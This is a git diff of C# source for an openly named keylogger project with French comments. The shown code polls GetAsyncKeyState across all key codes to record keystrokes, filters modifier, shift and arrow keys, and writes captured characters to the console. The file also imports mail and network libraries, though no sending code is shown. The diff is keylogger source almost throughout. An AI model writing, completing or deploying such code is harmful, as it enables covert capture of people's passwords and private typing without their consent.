@@ -1,15 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Xml.Serialization;
-using System.IO;
-using System.Xml.Serialization;
 using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
-using System.Net.Mail;
 using System.Threading;
-using System.Windows.Input;
 
 namespace ProjetKeyLogger
 {
@@ -68,7 +62,7 @@ namespace ProjetKeyLogger
 
                 //liste des touches pour lesquelles la saisie est intérrompue
                 //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91,160};
+                int[] list_non_accepte = new int[] { 17 ,18 ,91};
 
                 //le tableau des touches d'interruptions de la capture est parcouru
                 for (int i = 0; i < list_non_accepte.Length; i++)
@@ -84,13 +78,14 @@ namespace ProjetKeyLogger
                 
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    string valeurs = "";
+                   
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
                     if (statut_cle == 32769 && autorise_saisie == true)
                     {
+                        string valeurs;
                         switch (codeASCII)
                         {
                             
@@ -162,7 +157,11 @@ namespace ProjetKeyLogger
                                 Console.Write(valeurs.Substring(codeASCII - 106, 1));
                                 break;
 
-                                                         
+                            //l'autre shift
+                            case 160:
+                            case 161:
+                                break;
+
                             case 186:
                             case 187:
                             case 188:
@@ -201,11 +200,19 @@ namespace ProjetKeyLogger
                                 Console.Write("<");
                                 break;
 
+                            //les fleches mais jsp pq les nombres sont associés à 255
+                            case 37:
+                            case 38:
+                            case 39:
+                            case 40:
+                            case 255:
+                                break;
+
 
                             default:
                                 if (majuscule == false)
                                 {
-                                    Console.Write(Char.ToLower((char)codeASCII));
+                                    Console.Write(Char.ToLower((char)codeASCII)+""+codeASCII);
                                 }
                                 else
                                 {
